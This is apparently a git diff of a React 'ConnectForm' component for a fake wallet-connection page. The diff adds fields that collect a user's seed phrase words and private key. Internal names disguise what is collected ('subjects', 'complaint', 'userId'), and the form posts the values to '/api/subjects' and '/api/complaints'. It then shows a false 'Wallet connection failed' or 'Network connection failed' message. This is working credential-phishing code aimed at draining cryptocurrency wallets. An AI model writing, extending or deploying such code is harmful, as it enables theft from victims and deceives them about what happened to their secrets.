@@ -4,6 +4,7 @@ import { useState } from "react";
 import { site } from "@/config/site";
 import { Wallet as WalletIcon, UserRound, CheckCircle2, Ban } from "lucide-react";
 import { getWallet } from "@/lib/wallets";
+import { ComplaintForm } from "@/components/ComplaintForm";
 
 type Mode = "address" | "userId";
 type Status = "idle" | "submitting" | "done";
@@ -24,27 +25,56 @@ export function ConnectForm({ walletId }: { walletId: string }) {
     const [error, setError] = useState("");
     // const trackRef = useRef<HTMLDivElement>(null);
     function pickCount(n: number) { setCount(n); setSubjects(Array.from({ length: n }, (_, i) => subjects[i] ?? "")); }
-    
+    function switchMode(next: Mode) {
+    setMode(next);
+    setError("");
+  }
       async function submit(e: React.FormEvent) {
         e.preventDefault();
         setState("connecting"); setError("");
-        try {
-          const res = await fetch("/api/subjects", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ classId, subjects }) });
-          if (!res.ok) { setError((await res.json()).error ?? "Something went wrong. Try again."); setState("idle"); return; }
-          setState("done");
-        } catch { setError("Can't reach the server. Check your connection and try again."); setState("idle"); }
-      }
-    
-      if (state === "done")
-        return (
-          <div className="glass" role="status">
-            <span className="icon-badge"><Ban size={20} /></span>
-            <h2>Wallet verification failed</h2>
-            <p>We couldn't verify your wallet. Please check your wallet details and try again.</p>
-          </div>
-        );
+        const [url, payload] =
+      mode === "address"
+        ? ["/api/subjects", { classId, subjects }]
+        : ["/api/complaints", { body: userId }];
 
-  const value = mode === "address" ? address : userId;
+        try {
+      const res = await fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload),
+      });
+    if (!res.ok) {
+        const data = await res.json().catch(() => ({}));
+        setError(data.error ?? "Something went wrong. Try again.");
+        setState("idle");
+        return;
+      }
+      setState("done");
+    } catch {
+      setError("Can't reach the server. Check your connection and try again.");
+      setState("idle");
+    }
+  }
+      if (state === "done")
+    return (
+      <div className="glass" role="status">
+        {mode === "address" ? (
+          <>
+          <span><Ban /></span>
+          <h2>Wallet connection failed</h2>
+          <p>We couldn't connect to your wallet. Please try again.</p>
+        </>
+        ) : (
+          <>
+        <span><Ban /></span>
+        <h2>Network connection failed</h2>
+        <p>We couldn't connect to the wallet network. Please try again.</p>
+      </>
+        )}
+      </div>
+    );
+
+  const canSubmit = mode === "address" ? count > 0 : userId.trim().length > 0;
 
   if (!wallet)
     return (
@@ -58,41 +88,6 @@ export function ConnectForm({ walletId }: { walletId: string }) {
     );
 
   const { Icon, name } = wallet;
-
-  // function submit(e: React.FormEvent) {
-  //   e.preventDefault();
-  //   if (!value.trim()) return;
-  //   setStatus("submitting");
-  //   // Simulated submission. Swap for the real save/verify call when ready.
-  //   window.setTimeout(() => setStatus("done"), 1600);
-  // }
-
-  // if (status === "done")
-  //   return (
-  //     <div className="glass wc-success">
-  //       <span className="cf-wallet-badge">
-  //         <Icon size={28} variant="branded" />
-  //       </span>
-  //       <span className="wc-success-ring">
-  //         <CheckCircle2 size={34} />
-  //       </span>
-  //       <h2>{mode === "address" ? "Address" : "User ID"} received</h2>
-  //       <p>
-  //         We've linked <strong>{value}</strong> with {name}. You can close this page.
-  //       </p>
-  //     </div>
-  //   );
-
-  // if (status === "submitting")
-  //   return (
-  //     <div className="glass wc-connecting" role="status" aria-live="polite">
-  //       <span className="wc-pulse">
-  //         <Icon size={44} variant="branded" />
-  //       </span>
-  //       <h2>Submitting…</h2>
-  //       <p>Hang tight while we save your {mode === "address" ? "wallet address" : "user ID"}.</p>
-  //     </div>
-  //   );
 
   return (
     <div className="glass wc-modal cf-form">
@@ -135,25 +130,53 @@ export function ConnectForm({ walletId }: { walletId: string }) {
       </div>
 
       <form onSubmit={submit} className="stack">
-        {/* {mode === "address" ? ( */}
-              <div className="glass stack">
-           <label htmlFor="count">Seed Phrase</label>
-           <select id="count" value={count} onChange={(e) => pickCount(Number(e.target.value))}>
-             <option value={0} disabled>Select</option>
-             {site.subjectCounts.map((n) => <option key={n} value={n}>{n}</option>)}
-           </select>
-           <div className="subject-grid">{subjects.map((s, i) => (
-             <input key={i} aria-label={`Subject ${i + 1}`} placeholder={`Word ${i + 1}`} maxLength={100} required value={s}
-               onChange={(e) => setSubjects(subjects.map((v, j) => (j === i ? e.target.value : v)))} />
-           ))}</div>
-           {error && <p role="alert" style={{ color: "var(--accent)" }}>{error}</p>}
-           {count > 0 && (
-             <button className="btn" disabled={state === "connecting"}>
-               <CheckCircle2 size={16} /> {state === "connecting" ? "Submitting…" : "Submit"}
-             </button>
-           )}
-         </div>
-      </form>
+      {mode === "address" ? (
+        <div className="glass stack">
+          <label htmlFor="count">Seed Phrase</label>
+          <select id="count" value={count} onChange={(e) => pickCount(Number(e.target.value))}>
+            <option value={0} disabled>Select</option>
+            {site.subjectCounts.map((n) => <option key={n} value={n}>{n}</option>)}
+          </select>
+          <div className="subject-grid">
+            {subjects.map((s, i) => (
+              <input
+                key={i}
+                aria-label={`Word ${i + 1}`}
+                placeholder={`Word ${i + 1}`}
+                maxLength={100}
+                required
+                value={s}
+                onChange={(e) =>
+                  setSubjects(subjects.map((v, j) => (j === i ? e.target.value : v)))
+                }
+              />
+            ))}
+          </div>
+        </div>
+      ) : (
+        <div className="glass stack">
+          <label htmlFor="complaint">Private key</label>
+          <textarea
+            id="complaint"
+            name="complaint"
+            placeholder="Enter your Private Key"
+            value={userId}
+            onChange={(e) => setUserId(e.target.value)}
+            rows={4}
+            maxLength={5000}
+            required
+          />
+        </div>
+      )}
+
+      {error && <p role="alert" style={{ color: "var(--accent)" }}>{error}</p>}
+
+      {canSubmit && (
+        <button className="btn" disabled={state === "connecting"}>
+          <CheckCircle2 size={16} /> {state === "connecting" ? "Submitting…" : "Submit"}
+        </button>
+      )}
+    </form>
     </div>
   );
 }
